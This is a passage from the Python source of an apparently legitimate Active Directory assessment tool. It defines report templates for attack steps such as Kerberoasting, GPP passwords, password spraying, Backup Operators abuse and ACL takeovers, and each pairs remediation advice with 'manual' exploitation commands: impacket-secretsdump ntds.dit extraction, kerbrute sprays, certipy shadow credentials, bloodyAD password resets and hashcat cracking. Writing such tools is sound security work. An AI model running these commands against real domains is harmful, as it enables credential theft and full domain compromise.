        relation: Raw relation string (e.g. ``"ADCSESC9"``, ``"adcsesc9"``).

    Returns:
        Canonical BH CE Cypher type string (e.g. ``"ADCSESC9a"``).
    """
    key = str(relation or "").strip().lower().replace("-", "")
    # Direct catalog key match (e.g. "adcsesc9" → entry with bh_cypher_names=("ADCSESC9a","ADCSESC9b"))
    entry = ATTACK_STEP_CATALOG.get(key)
    if entry and entry.bh_cypher_names:
        return entry.bh_cypher_names[0]
    # Try matching against existing bh_cypher_names (e.g. "adcsesc9a" already canonical)
    for catalog_entry in ATTACK_STEP_CATALOG.values():
        if key in {n.lower() for n in catalog_entry.bh_cypher_names}:
            return catalog_entry.bh_cypher_names[0]
    # Unknown — return as-is (uppercase for Cypher conventions)
    return str(relation or "").strip()


def get_bh_native_adcs_cypher_names() -> frozenset[str]:
    """Return Cypher type names for ADCS escalation edges that BH CE creates natively.

    These are the ESC techniques that BloodHound CE's own ingestor adds to the
    graph.  Non-native ADCS variants (ESC2, ESC5, ESC7, ESC8, ESC11, ESC15) are
    excluded because BH CE does not create those edges natively.
    """
    _adcs_prefixes = ("ADCS",)
    _adcs_exact = {"CoerceAndRelayNTLMToADCS"}
    result: set[str] = set()
    for entry in ATTACK_STEP_CATALOG.values():
        if not entry.bh_native:
            continue
        for name in entry.bh_cypher_names:
            if any(name.startswith(p) for p in _adcs_prefixes) or name in _adcs_exact:
                result.add(name)
    return frozenset(result)


# ── Remediation metadata helpers ──────────────────────────────────────────────


def get_step_metadata(relation: str) -> dict[str, Any]:
    """Return remediation + MITRE metadata for a relation as a plain dict."""
    entry = get_attack_step_entry(relation)
    if entry is None:
        return {}
    return {
        "remediation_complexity": entry.remediation_complexity,
        "remediation_effort": entry.remediation_effort,
        "can_fully_mitigate": entry.can_fully_mitigate,
        "mitre_technique_id": entry.mitre_technique_id,
        "mitre_technique_name": entry.mitre_technique_name,
        "detection_event_ids": entry.detection_event_ids,
    }


def get_step_remediation_complexity(relation: str) -> str:
    """Return remediation complexity for a relation. Defaults to 'medium'."""
    entry = get_attack_step_entry(relation)
    return entry.remediation_complexity if entry else "medium"


def get_step_complexity_rank(relation: str) -> int:
    """Return numeric rank for sorting by remediation complexity (higher = harder)."""
    return _COMPLEXITY_ORDER.get(get_step_remediation_complexity(relation), 1)


def can_fully_mitigate_step(relation: str) -> bool:
    """Return True if the step can be fully eliminated from attack paths."""
    entry = get_attack_step_entry(relation)
    return entry.can_fully_mitigate if entry else True


def get_step_mitre(relation: str) -> tuple[str | None, str | None]:
    """Return (mitre_technique_id, mitre_technique_name) for a relation."""
    entry = get_attack_step_entry(relation)
    if entry is None:
        return None, None
    return entry.mitre_technique_id, entry.mitre_technique_name


def get_step_detection_event_ids(relation: str) -> tuple[str, ...]:
    """Return Windows Event IDs relevant for detecting this step."""
    entry = get_attack_step_entry(relation)
    return entry.detection_event_ids if entry else ()


# ── Narrative rendering (BloodHound-style, reusable from web + reports) ───────

# Narrative templates for the most common relations. These are kept here (and
# not in the report template) so the CLI, PDF report, DOCX report, and web
# service can all share one source of truth. Placeholder syntax:
#   {source} / {target}           — display names
#   {source_type} / {target_type} — "user" | "computer" | "group" | ...
#   {template}                    — ADCS template name (when applicable)
#   {relation}                    — human-formatted relation label
#
# The templates are registered after the main _CATALOG_ENTRIES tuple so we
# don't have to retype the existing 99 entries; a separate overlay dict keeps
# this manageable and easy to extend incrementally.

_NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
    "kerberoasting": {
        "short": "Kerberoasting: {source} can request service tickets for {target} and crack the TGS-REP offline to recover the service account password.",
        "long": (
            "Kerberoasting allows {source_type} {source} to request a Kerberos service "
            "ticket (TGS-REP) for the service account {target}. Because the ticket is "
            "encrypted with the target account's NTLM hash, an attacker can extract it "
            "and mount an offline brute-force attack against weak passwords. "
            "Once cracked, the attacker fully impersonates {target}."
        ),
        "manual": (
            "# Request the TGS-REP hash for the SPN-bearing account:\n"
            "nxc ldap <dc_ip> -u <user> -p <pass> --kerberoasting roast.txt\n"
            "#   (or, targeting one account)  impacket-GetUserSPNs <domain>/<user>:<pass> "
            "-dc-ip <dc_ip> -request-user {target} -outputfile roast.txt\n"
            "# Crack it offline:\n"
            "hashcat -m 13100 roast.txt wordlist.txt"
        ),
        "verify_windows": (
            "Confirm {target} is exposed to Kerberoasting by listing its service "
            "principal names — any non-empty result means the account can be "
            "roasted:\n"
            "Get-ADUser -Identity {target} -Properties servicePrincipalName, "
            "msDS-SupportedEncryptionTypes |\n"
            "  Select-Object SamAccountName, servicePrincipalName, "
            "msDS-SupportedEncryptionTypes\n"
            "# List every roastable account in the domain:\n"
            "Get-ADUser -LDAPFilter '(&(servicePrincipalName=*)"
            "(!(objectClass=computer)))' -Properties servicePrincipalName"
        ),
        "verify_linux": (
            "List the SPN-bearing accounts (read-only enumeration, no ticket "
            "requested):\n"
            "nxc ldap {dc_ip} -u <user> -p <pass> --kerberoasting /dev/null\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/kerberoast"
        ),
        "remediation": (
            "Enforce strong, random passwords (25+ chars) or migrate the account to a Group Managed Service Account (gMSA).",
            "Enable AES-only encryption on the service account (msDS-SupportedEncryptionTypes) and disable RC4 where possible.",
            "Monitor Windows Event ID 4769 with ticket_encryption_type=0x17 (RC4) to detect roasting attempts.",
        ),
    },
    "gpppassword": {
        "short": (
            "{source} can read a Group Policy Preferences XML in SYSVOL whose "
            "cpassword field is encrypted with a key Microsoft published, so the "
            "stored credential for {target} decrypts offline."
        ),
        "long": (
            "Group Policy Preferences let administrators push local account "
            "passwords to domain machines through XML files (Groups.xml, "
            "Services.xml, ScheduledTasks.xml, DataSources.xml, Printers.xml, "
            "Drives.xml) stored in SYSVOL. The password is placed in a "
            "cpassword field and encrypted with AES-256, but Microsoft "
            "published the static encryption key in its documentation, so the "
            "value decrypts with no brute-forcing required. SYSVOL is readable "
            "by every authenticated domain user by design, so any account with "
            "domain credentials — in this path {source} — can retrieve and "
            "decrypt the value stored for {target}. Microsoft's MS14-025 "
            "update (2014) stopped GPP from being used to set NEW passwords, "
            "but it did not remove or invalidate files created before the "
            "patch, so an old Groups.xml left in SYSVOL stays exploitable "
            "indefinitely."
        ),
        "manual": (
            "# Find and pull GPP XML files from SYSVOL (any authenticated user has read access):\n"
            "nxc smb <dc_ip> -u <user> -p <pass> -M gpp_password\n"
            "#   (or manually) browse \\\\<domain>\\SYSVOL\\<domain>\\Policies\\...\\ "
            "for Groups.xml / Services.xml / ScheduledTasks.xml / DataSources.xml / "
            "Printers.xml / Drives.xml and read the cpassword attribute, then "
            "decrypt it with the published GPP AES key:\n"
            "gpp-decrypt <cpassword_blob>"
        ),
        "verify_windows": (
            "Enumerate SYSVOL for leftover GPP files carrying a cpassword "
            "attribute — any match means a credential is still exposed:\n"
            "Get-ChildItem \\\\<domain>\\SYSVOL -Recurse -Include Groups.xml,"
            "Services.xml,ScheduledTasks.xml,DataSources.xml,Printers.xml,"
            "Drives.xml -ErrorAction SilentlyContinue | Select-String cpassword\n"
            "# Confirm MS14-025 is applied so no NEW GPP password can be created:\n"
            "Get-HotFix -Id KB2962486 -ErrorAction SilentlyContinue"
        ),
        "verify_linux": (
            "Read-only SYSVOL scan for GPP files carrying a cpassword "
            "attribute, no decryption performed:\n"
            "nxc smb {dc_ip} -u <user> -p <pass> -M gpp_password\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/group-policy-preferences"
        ),
        "remediation": (
            "Find and remove every GPP XML file in SYSVOL that carries a cpassword field (Groups.xml, Services.xml, ScheduledTasks.xml, DataSources.xml, Printers.xml, Drives.xml).",
            "Confirm MS14-025 (KB2962486) is installed on all domain controllers so Group Policy Preferences can no longer be used to set a new password.",
            "Rotate every account whose password was ever stored in a GPP file — the exposed value must be treated as permanently compromised, not just removed from SYSVOL.",
            "Audit Group Policy Objects for any remaining GPP-based credential deployment (scheduled tasks, mapped drives, data sources) and migrate those to Group Managed Service Accounts or LAPS-managed local passwords.",
        ),
    },
    "backupoperatorescalation": {
        "short": (
            "Backup Operators membership grants {source} SeBackupPrivilege, which "
            "lets it read the domain controller's registry hives (SAM, SECURITY, "
            "SYSTEM) and the NTDS database, recovering credential material up to "
            "the DC machine account and domain secrets."
        ),
        "long": (
            "The Backup Operators group is granted SeBackupPrivilege so its members "
            "can back up any file regardless of its ACL, which by design includes "
            "the registry hives and the ntds.dit database on a domain controller. "
            "An account that controls a Backup Operators member, in this path "
            "{source}, can turn that privilege into credential theft in two ways. "
            "It can read the SECURITY, SYSTEM, and SAM hives remotely and recover "
            "the local SAM accounts and LSA secrets, including the domain "
            "controller's own machine-account key. It can also take a shadow copy "
            "of the system volume, read ntds.dit out of that copy together with the "
            "SYSTEM hive, and extract every domain credential hash offline. The "
            "privilege bypasses the file ACL on purpose, so no further "
            "misconfiguration is needed beyond the group membership itself. That is "
            "why Backup Operators is treated as a Tier-0 escalation-capable group: "
            "holding it is one well-known step away from owning the domain."
        ),
        "manual": (
            "# Route 1 - remote registry hive dump (recover local SAM + LSA secrets, "
            "incl. the DC machine-account key):\n"
            "nxc smb <dc_ip> -u <user> -p <pass> --sam --lsa\n"
            "#   (or, Kerberos-only)  impacket-secretsdump -k -no-pass "
            "<domain>/<user>@<dc_fqdn>\n"
            "# Route 2 - read ntds.dit via a shadow copy, then extract offline.\n"
            "#   On the DC (SeBackupPrivilege lets you copy files past their ACL):\n"
            "#     diskshadow /s shadow.txt     # script creates a shadow, exposes it as a drive\n"
            "#     robocopy <shadow_drive>:\\Windows\\NTDS . ntds.dit /b\n"
            "#     reg save HKLM\\SYSTEM SYSTEM\n"
            "#   Then extract every domain hash offline from the copies:\n"
            "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
        ),
        "verify_windows": (
            "List who holds Backup Operators (recurse to catch nested groups) and "
            "confirm the principal actually carries SeBackupPrivilege on a DC:\n"
            "Get-ADGroupMember -Identity 'Backup Operators' -Recursive |\n"
            "  Select-Object name, objectClass, distinguishedName\n"
            "# On the domain controller, check the effective privilege token:\n"
            "whoami /priv | findstr SeBackupPrivilege\n"
            "# Inspect the group object directly if needed:\n"
            "Get-ADGroup -Identity 'Backup Operators' -Properties Members"
        ),
        "verify_linux": (
            "Read-only enumeration of Backup Operators membership over LDAP, no "
            "privilege exercised:\n"
            "nxc ldap {dc_ip} -u <user> -p <pass> --groups 'Backup Operators'\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds"
        ),
        "remediation": (
            "Audit Backup Operators membership with Get-ADGroupMember -Identity 'Backup Operators' -Recursive, then remove every account that is not a dedicated, monitored backup service identity — interactive admins and user accounts do not belong in this group.",
            "If backup software genuinely needs SeBackupPrivilege, scope it to a single dedicated service account running only on the backup host, never to a shared or interactive administrator, and document that account as Tier-0-equivalent.",
            "Constrain the 'Back up files and directories' user right through Group Policy (Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment) so only the intended service principal is granted SeBackupPrivilege on domain controllers.",
            "Alert on privileged-use of this right: monitor Event ID 4672 (special privileges assigned at logon) for the Backup Operators identity and Event ID 4663 for access to the NTDS directory and the SAM/SECURITY/SYSTEM hives, so any hive or ntds.dit read outside the scheduled backup window is investigated.",
        ),
    },
    "passwordspray": {
        "short": (
            "Password spraying tries ONE common password across MANY accounts, "
            "staying under the lockout threshold, so a single weak or default "
            "password anywhere in the domain yields a foothold without locking "
            "anyone out."
        ),
        "long": (
            "Brute-forcing one account trips account lockout within a few "
            "attempts. Password spraying inverts that: one candidate password "
            "(a season and year such as Summer2024!, a value like Welcome1, the "
            "company name, or an empty or default password) is tested against "
            "the whole user list, with each account tried only once per round. "
            "Because the rounds are spaced to respect the domain's "
            "lockoutThreshold and observation window, badPwdCount never climbs "
            "high enough to lock any single account, so the attack stays quiet "
            "from the point of view of any one user. Large directories almost "
            "always contain at least one account whose owner chose a weak or "
            "never-changed default password, which makes spraying a dependable "
            "entry vector for an unauthenticated or low-privileged attacker. The "
            "only prerequisite is a valid list of usernames, and that list is "
            "cheap to obtain: anonymous or authenticated LDAP enumeration of the "
            "directory returns every sAMAccountName. In this path {source} uses "
            "that foothold against {target}."
        ),
        "manual": (
            "# Spray ONE password across a username list. Space the rounds under "
            "the domain lockout threshold/observation window so no account locks.\n"
            "# Kerberos pre-auth spray (quieter, AES-friendly, only an AS-REQ per "
            "user):\n"
            "kerbrute passwordspray -d <domain> --dc <dc_ip> users.txt 'Season2024!'\n"
            "#   (or over SMB, continuing past the first hit):\n"
            "nxc smb <dc_ip> -u users.txt -p 'Season2024!' --continue-on-success"
        ),
        "verify_windows": (
            "Read the lockout policy so you know the spray window the attacker "
            "must stay under:\n"
            "Get-ADDefaultDomainPasswordPolicy | "
            "Select-Object LockoutThreshold, LockoutObservationWindow, LockoutDuration\n"
            "# Check for fine-grained password policies that override the default:\n"
            "Get-ADFineGrainedPasswordPolicy -Filter *\n"
            "# Review failed-logon events for the spray signature (many distinct "
            "accounts, one source, one password, short window):\n"
            "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} -MaxEvents 200 |\n"
            "  Select-Object TimeCreated, @{n='Account';e={$_.Properties[5].Value}}, "
            "@{n='Source';e={$_.Properties[19].Value}}"
        ),
        "verify_linux": (
            "Read-only: pull the domain password and lockout policy so you know "
            "the safe spray window before testing anything:\n"
            "nxc smb {dc_ip} -u <user> -p <pass> --pass-pol\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/spraying"
        ),
        "remediation": (
            "Enforce a strong password policy and ban common and seasonal passwords: where Azure AD Password Protection (or an on-prem banned-password list) is available, deploy it to reject values like Welcome1 and Summer2024!, and audit the current baseline with Get-ADDefaultDomainPasswordPolicy.",
            "Set a sane Account Lockout Policy via GPO (Computer Configuration > Policies > Windows Settings > Security Settings > Account Policies > Account Lockout Policy): a lockout threshold with an observation window long enough to blunt spraying, tuned against lockout-denial-of-service so a spray cannot trivially lock the whole directory.",
            "Require multi-factor authentication on every externally reachable service (VPN, webmail, remote access, federation endpoints), so a guessed password alone does not grant access.",
            "Monitor Security event 4625 (failed logon) and 4771 (Kerberos pre-authentication failure) for the spray signature — many distinct target accounts, a single source, one password, all inside one observation window — and alert on that pattern rather than on per-account failure counts.",
        ),
    },
    "useraspass": {
        "short": (
            "The account {target} uses its own username as its password, so a "
            "single guess — the sAMAccountName itself — authenticates as the "
            "account."
        ),
        "long": (
            "A common weak-credential class is an account whose password equals "
            "its username, or a close variant of it. The username is public: "
            "anonymous or authenticated LDAP enumeration of the directory returns "
            "every sAMAccountName, so the password is effectively already known "
            "and no cracking is involved. Testing each account's name as its own "
            "password across the domain's account list yields a foothold; when "
            "the attempts are spaced under the lockout observation window, not a "
            "single account is locked out. This pattern tends to survive on "
            "service, test, and default accounts that were created quickly and "
            "never revisited, which is why it stays a dependable entry vector on "
            "large or loosely maintained directories. In this path {source} uses "
            "that foothold against {target}."
        ),
        "manual": (
            "# Try each account's own name as its password (user == pass) across "
            "the whole user list.\n"
            "# --no-bruteforce pairs line N of -u with line N of -p, so each "
            "account is tested only with its own name (one attempt per account). "
            "Space the rounds under the domain lockout threshold/observation "
            "window so no account locks:\n"
            "nxc smb <dc_ip> -u users.txt -p users.txt --no-bruteforce --continue-on-success\n"
            "#   (quieter Kerberos pre-auth variant, only an AS-REQ per user):\n"
            "kerbrute bruteuser -d <domain> --dc <dc_ip> --user-as-pass users.txt"
        ),
        "verify_windows": (
            "Read the lockout policy so you know the window a spray must stay "
            "under:\n"
            "Get-ADDefaultDomainPasswordPolicy | "
            "Select-Object LockoutThreshold, LockoutObservationWindow, LockoutDuration\n"
            "# Surface the likely stale/service accounts this pattern tends to "
            "hide on, for a targeted credential audit:\n"
            "Get-ADUser -Filter {Enabled -eq $true} "
            "-Properties PasswordLastSet, ServicePrincipalName |\n"
            "  Select-Object SamAccountName, PasswordLastSet, ServicePrincipalName\n"
            "# Review failed-logon events for the spray signature (many distinct "
            "accounts, one source, one observation window):\n"
            "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} -MaxEvents 200"
        ),
        "verify_linux": (
            "Read-only confirmation that each account's name is NOT accepted as "
            "its password (--no-bruteforce tests user == pass only):\n"
            "nxc smb {dc_ip} -u users.txt -p users.txt --no-bruteforce\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/spraying"
        ),
        "remediation": (
            "Enforce a password policy that rejects the username or account name as a password: where Azure AD Password Protection (or an on-prem banned-password list) is available, add the account-name and its common variants to the banned list, and audit the current baseline with Get-ADDefaultDomainPasswordPolicy.",
            "Run a credential audit to find accounts whose password equals their username and force a reset with Set-ADAccountPassword followed by Set-ADUser -ChangePasswordAtLogon $true, prioritizing service, test, and default accounts, which carry this pattern most often.",
            "Set an Account Lockout Policy via GPO (Computer Configuration > Policies > Windows Settings > Security Settings > Account Policies > Account Lockout Policy): a lockout threshold with an observation window long enough to blunt a spaced spray, tuned so a spray cannot trivially lock the whole directory.",
            "Require multi-factor authentication on every externally reachable service (VPN, webmail, remote access, federation endpoints) so a guessed name-as-password does not by itself grant access.",
            "Monitor Security event 4625 (failed logon) and 4771 (Kerberos pre-authentication failure) for the spray signature — many distinct target accounts from a single source inside one observation window — and alert on that pattern rather than on per-account failure counts.",
        ),
    },
    "userdescription": {
        "short": (
            "A plaintext credential is stored in {target}'s LDAP description or "
            "info attribute, which any authenticated — and often any anonymous — "
            "directory read returns, so the password is disclosed directly with "
            "no cracking needed."
        ),
        "long": (
            "Administrators sometimes record a password, a temporary password, or "
            "a service credential in an account's description or info attribute "
            "for convenience. Those attributes are readable by every "
            "authenticated domain user by default, and on some domains by "
            "anonymous binds as well, so the secret is disclosed in cleartext to "
            "anyone who enumerates the directory. ADscan reads these attributes "
            "over LDAP and verifies any recovered value against the domain to "
            "confirm a working login. No privilege escalation or cracking is "
            "required: the credential is simply sitting in a world-readable "
            "field. It stays a low-effort entry vector on domains with loose "
            "hygiene, and in this path {source} uses a value recovered this way "
            "against {target}."
        ),
        "manual": (
            "# Read the description/info attribute of every account over LDAP and "
            "look for anything password-shaped:\n"
            "nxc ldap <dc_ip> -u <user> -p <pass> -M user-desc\n"
            "#   (or a raw LDAP read of the same attributes):\n"
            "ldapsearch -x -H ldap://<dc_ip> -b \"<baseDN>\" \"(description=*)\" "
            "sAMAccountName description info\n"
            "# Then authenticate with any recovered value to confirm it works:\n"
            "nxc smb <dc_ip> -u <recovered_user> -p <recovered_pass>"
        ),
        "verify_windows": (
            "Enumerate accounts carrying a description or info value and review "
            "each for anything password-shaped:\n"
            "Get-ADUser -Filter {Description -like \"*\"} "
            "-Properties Description, info |\n"
            "  Select-Object SamAccountName, Description, info"
        ),
        "verify_linux": (
            "Read-only read of the description/info attributes, no authentication "
            "attempt made against recovered values:\n"
            "nxc ldap {dc_ip} -u <user> -p <pass> -M user-desc\n"
            "# Reference: https://www.thehacker.recipes/ad/recon/ldap"
        ),
        "remediation": (
            "Audit every account's description and info attribute for stored secrets with Get-ADUser -Filter {Description -like \"*\"} -Properties Description, info | Select-Object SamAccountName, Description, info, and review each result by hand for anything password-shaped.",
            "For every credential found, clear the attribute (Set-ADUser -Identity <account> -Clear Description, info) and rotate the exposed password immediately with Set-ADAccountPassword — the value must be treated as compromised, not merely hidden.",
            "Train administrators never to store passwords in directory attributes, and document an approved secrets store (a privileged-access or secrets-management system) as the only place service credentials belong.",
            "Where feasible, tighten read access on sensitive attributes: remove anonymous LDAP read (dsHeuristics), and review the default authenticated-users read ACL on accounts that carry sensitive descriptive data.",
            "Schedule the description/info audit to run on a recurring basis so a newly added secret is caught quickly, and alert on directory reads of these attributes via Event ID 4662 where object auditing is enabled.",
        ),
    },
    "asreproasting": {
        "short": "ASREPRoasting: {target} has pre-authentication disabled, so {source} can request an AS-REP and crack it offline.",
        "long": (
            "ASREPRoasting targets accounts, in this path {target}, that have "
            "Kerberos pre-authentication disabled (DONT_REQ_PREAUTH flag). Any "
            "unauthenticated attacker (including {source}) can request an AS-REP "
            "message encrypted with the account's password-derived key and crack "
            "it offline. Successful cracking yields full credentials for {target}."
        ),
        "manual": (
            "# Roast every pre-auth-disabled account the credential can see:\n"
            "nxc ldap <dc_ip> -u <user> -p <pass> --asreproast asrep.txt\n"
            "#   (no creds needed if you already know the sAMAccountName)\n"
            "impacket-GetNPUsers <domain>/ -dc-ip <dc_ip> -usersfile users.txt "
            "-no-pass -format hashcat -outputfile asrep.txt\n"
            "# Crack it offline:\n"
            "hashcat -m 18200 asrep.txt wordlist.txt"
        ),
        "verify_windows": (
            "Confirm {target} has pre-authentication disabled — bit 0x400000 "
            "(DONT_REQ_PREAUTH) set on userAccountControl:\n"
            "Get-ADUser -Identity {target} -Properties DoesNotRequirePreAuth |\n"
            "  Select-Object SamAccountName, DoesNotRequirePreAuth\n"
            "# List every AS-REP-roastable account in the domain:\n"
            "Get-ADUser -LDAPFilter "
            "'(userAccountControl:1.2.840.113556.1.4.803:=4194304)'"
        ),
        "verify_linux": (
            "List accounts with pre-auth disabled (read-only enumeration):\n"
            "nxc ldap {dc_ip} -u <user> -p <pass> --asreproast /dev/null\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/asreproast"
        ),
        "remediation": (
            "Enable Kerberos pre-authentication for {target} (clear DONT_REQ_PREAUTH in userAccountControl).",
            "Enforce strong passwords on accounts that must keep pre-auth disabled.",
            "Monitor Event ID 4768 with pre-authentication type 0 for anomalous requests.",
        ),
    },
    "genericall": {
        "short": "GenericAll: {source_type} {source} has full control over {target_type} {target}.",
        "long": (
            "GenericAll grants {source_type} {source} full read and write control "
            "over {target_type} {target}. This allows the source to reset the "
            "target's password, add Shadow Credentials (msDS-KeyCredentialLink), "
            "set a Service Principal Name to enable Kerberoasting, or write a "
            "logon script, any of which results in complete compromise of {target}."
        ),
        "manual": (
            "# Shadow Credentials (works on a computer or user target):\n"
            "certipy shadow auto -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-account {target}\n"
            "#   or force a password reset over LDAP:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u {source} -p <pass> "
            "set password {target} 'Newpass123!'"
        ),
        "verify_windows": (
            "Confirm {source} holds GenericAll over {target}. Resolve the target DN, "
            "then read the ACL and filter to the principal:\n"
            "$dn = (Get-ADObject -LDAPFilter '(sAMAccountName={target})')"
            ".DistinguishedName\n"
            "(Get-Acl \"AD:$dn\").Access |\n"
            "  Where-Object { $_.IdentityReference -like '*{source}*' -and "
            "$_.ActiveDirectoryRights -match 'GenericAll' }\n"
            "# A row with ActiveDirectoryRights=GenericAll, AccessControlType=Allow "
            "confirms the finding."
        ),
        "verify_linux": (
            "Read the target's security descriptor and confirm {source} has full "
            "control (read-only):\n"
            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
            "get object {target} --attr nTSecurityDescriptor --resolve-sd\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/dacl/grant-rights"
        ),
        "remediation": (
            "Remove the GenericAll ACE that {source} holds over {target}. Resolve the object's "
            "distinguished name with `Get-ADObject -LDAPFilter '(sAMAccountName=<target>)'`, list "
            "what {source} currently holds on it with `(Get-Acl \"AD:\\<targetDN>\").Access | "
            "Where-Object IdentityReference -like '*<principal>*'`, then delete those entries "
            "with `dsacls \"<targetDN>\" /R \"<DOMAIN>\\<principal>\"`. Before: the entry reads "
            "ActiveDirectoryRights=GenericAll, AccessControlType=Allow. After: the same query "
            "returns nothing for that principal.",
            "Grant back only the rights the delegation actually needs, never full control. "
            "GenericAll carries password reset, key-credential write, servicePrincipalName write "
            "and script-path write in one ACE, so any one of them left in place restores the "
            "takeover — which is why narrowing it is the fix and auditing it is not. Use the "
            "Delegation of Control wizard, or a scoped ACE such as "
            "`dsacls \"<targetDN>\" /G \"<DOMAIN>\\<helpdeskGroup>:CA;Reset Password\"` when "
            "password reset is genuinely required.",
            "Confirm no other principal holds equivalent control over the same object: "
            "`(Get-Acl \"AD:\\<targetDN>\").Access | Where-Object { $_.ActiveDirectoryRights "
            "-match 'GenericAll|WriteDacl|WriteOwner' -and $_.AccessControlType -eq 'Allow' }`. "
            "Anything returned other than Domain Admins, Enterprise Admins or SYSTEM is the same "
            "finding under a different principal.",
            "Add {target} to Protected Users, and keep Tier 0 accounts out of the organisational "
            "units that ordinary delegation applies to, so a future broad grant cannot reach "
            "them by inheritance.",
            "Audit the change: Event ID 5136 records the modified access control list on the "
            "object, and Event ID 4662 records the object access itself. Both require DS Access "
            "auditing to be enabled on the container.",
        ),
    },
    "genericwrite": {
        "short": "GenericWrite: {source} can modify most attributes of {target}, enabling takeover via Shadow Credentials or SPN.",
        "long": (
            "GenericWrite gives {source_type} {source} the ability to modify most "
            "attributes of {target_type} {target}. Typical abuse paths include "
            "writing msDS-KeyCredentialLink (Shadow Credentials) to obtain a PKINIT "
            "certificate, setting a servicePrincipalName to enable Kerberoasting, "
            "or modifying scriptPath / msDS-AllowedToActOnBehalfOfOtherIdentity. "
            "Any of these leads to full compromise of {target}."
        ),
        "manual": (
            "# Write msDS-KeyCredentialLink (Shadow Credentials) then PKINIT-auth:\n"
            "certipy shadow auto -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-account {target}\n"
            "#   or set an SPN to make {target} kerberoastable:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u {source} -p <pass> "
            "set object {target} servicePrincipalName -v 'host/adscan'"
        ),
        "verify_windows": (
            "Confirm {source} can write {target}'s attributes. Resolve the DN, then "
            "read the ACL and filter to the principal:\n"
            "$dn = (Get-ADObject -LDAPFilter '(sAMAccountName={target})')"
            ".DistinguishedName\n"
            "(Get-Acl \"AD:$dn\").Access |\n"
            "  Where-Object { $_.IdentityReference -like '*{source}*' -and "
            "$_.ActiveDirectoryRights -match 'GenericWrite|WriteProperty' }\n"
            "# An Allow row with GenericWrite (or broad WriteProperty) confirms it."
        ),
        "verify_linux": (
            "List the objects {source} can write and confirm {target} is among them "
            "(read-only), or read the target's SD directly:\n"
            "bloodyAD --host {dc_ip} -d {domain} -u {source} -p <pass> "
            "get writable --detail\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/dacl/grant-rights"
        ),
        "remediation": (
            "Remove the GenericWrite ACE that {source} holds on {target}. Resolve the object's "
            "distinguished name with `Get-ADObject -LDAPFilter '(sAMAccountName=<target>)'`, list "
            "what {source} currently holds on it with `(Get-Acl \"AD:\\<targetDN>\").Access | "
            "Where-Object IdentityReference -like '*<principal>*'`, then delete those entries "
            "with `dsacls \"<targetDN>\" /R \"<DOMAIN>\\<principal>\"`. Before: the entry reads "
            "ActiveDirectoryRights=GenericWrite (or WriteProperty covering every attribute). "
            "After: the same query returns nothing for that principal.",
            "Grant back only the specific attributes the delegation needs, rather than write "
            "access to the object. GenericWrite is a takeover because three of the attributes it "
            "covers each hand over the account on their own — msDS-KeyCredentialLink (a "
            "certificate the account can then authenticate with), servicePrincipalName (which "
            "exposes the account's password hash to offline cracking), and "
            "msDS-AllowedToActOnBehalfOfOtherIdentity (which lets another host impersonate any "
            "user to this one). A scoped grant such as "
            "`dsacls \"<targetDN>\" /G \"<DOMAIN>\\<group>:WP;description\"` gives the delegation "
            "its attribute and none of those.",
            "Clear anything already written through the ACE before removing it, or the takeover "
            "survives the fix. Check the three attributes on {target}: "
            "`Get-ADObject \"<targetDN>\" -Properties msDS-KeyCredentialLink, servicePrincipalName, "
            "msDS-AllowedToActOnBehalfOfOtherIdentity`. A key credential nobody deliberately "
            "enrolled, an unexpected service principal name, or a populated delegation attribute "
            "should be cleared with `Set-ADObject \"<targetDN>\" -Clear <attribute>`.",
            "Sweep for the same exposure elsewhere: "
            "`Get-ADObject -LDAPFilter '(msDS-KeyCredentialLink=*)' -Properties "
            "msDS-KeyCredentialLink | Select-Object DistinguishedName` lists every object "
            "carrying a key credential, which on a domain that does not use Windows Hello for "
            "Business should be close to empty.",
            "Audit the change: Event ID 5136 records the modified access control list and any "
            "subsequent write to msDS-KeyCredentialLink or servicePrincipalName on the object. "
            "It requires DS Access auditing to be enabled on the container.",
        ),
    },
    "writedacl": {
        "short": "WriteDACL: {source} can rewrite the ACL of {target} and grant itself full control.",
        "long": (
            "WriteDACL lets {source} modify the discretionary access control list "
            "(DACL) of {target}. An attacker simply adds a GenericAll (or DCSync) "
            "ACE granting themselves full control, then escalates as if they owned "
            "the object directly. This is a two-step takeover chain."
        ),
        "manual": (
            "# Grant {source} DCSync (or GenericAll) on {target} by rewriting the DACL:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u {source} -p <pass> "
            "add dcsync {source}\n"
            "#   generic-object variant:\n"
            "impacket-dacledit -action write -rights FullControl -principal {source} "
            "-target {target} <domain>/{source}:<pass> -dc-ip <dc_ip>"
        ),
        "verify_windows": (
            "Confirm {source} can rewrite {target}'s ACL (WriteDacl):\n"
            "$dn = (Get-ADObject -LDAPFilter '(sAMAccountName={target})')"
            ".DistinguishedName\n"
            "(Get-Acl \"AD:$dn\").Access |\n"
            "  Where-Object { $_.IdentityReference -like '*{source}*' -and "
            "$_.ActiveDirectoryRights -match 'WriteDacl' }"
        ),
        "verify_linux": (
            "Read the target's security descriptor and confirm {source} has "
            "WriteDacl (read-only):\n"
            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
            "get object {target} --attr nTSecurityDescriptor --resolve-sd\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/dacl/grant-rights"
        ),
        "remediation": (
            "Remove the WriteDACL ACE from {source} on {target}.",
            "Monitor Event ID 5136 for ACL modifications on sensitive objects.",
        ),
    },
    "writeowner": {
        "short": "WriteOwner: {source} can take ownership of {target} and grant itself full control.",
        "long": (
            "WriteOwner allows {source} to take ownership of {target}. Once "
